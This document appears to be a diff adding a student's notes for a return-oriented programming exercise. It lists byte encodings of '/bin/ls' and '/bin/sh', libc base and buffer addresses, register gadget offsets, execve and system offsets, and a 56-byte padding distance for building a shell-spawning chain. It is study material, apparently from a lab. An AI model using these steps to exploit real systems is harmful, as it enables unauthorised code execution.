@@ -1,0 +1,26 @@
+1. RAW BYTES of "/bin/ls\0": 2f 62 69 6e 2f 6c 73 00
+2. Libc start address: 0x7ffff7a3a000
+3. Buffer address: 0x7fffffffe750  e960
+4. RDI gadget address: (offset: 0x116ee2) 0x7ffff7b50ee2
+5. RSI gadget address: (offset: 0x110e3e) 0x7ffff7b4ae3e
+6. RDX gadget address: (offset: 0xf5295) 0x7ffff7b2f295
+7. Libc start + execve offset: (offset: 0xb8640) 0x7ffff7af2640
+8. distence 0x48 -16 = 56
+
+/usr/bin/who\0: 2f 75 73 72 2f 62 69 6e 2f 77 68 6f 00
+
+
+-----------------------------------NEW---------------------------
+1. RAW BYTES of "/bin/ls\0": 2f 62 69 6e 2f 6c 73 00
+2. Libc start address: 0x7f6ffc4f1000
+3. Buffer address: 0x7fffffffe950
+4. RDI gadget address: (offset: 0x116ee2) 0x7f6ffc607ee2
+5. RSI gadget address: (offset: 0x110e3e) 0x7f6ffc601e3e
+6. RDX gadget address: (offset: 0xf5295) 0x7f6ffc5e6295
+7. Libc start + execve offset: (offset: 0xb8640) 0x7f6ffc5a9640
+8. distence 0x48 -16 = 56
+
+/usr/bin/who\0: 2f 75 73 72 2f 62 69 6e 2f 77 68 6f 00
+
+/bin/sh\0: 2f 62 69 6e 2f 73 68 00
+system 0x3f480  0x 7fff f7a7 9480
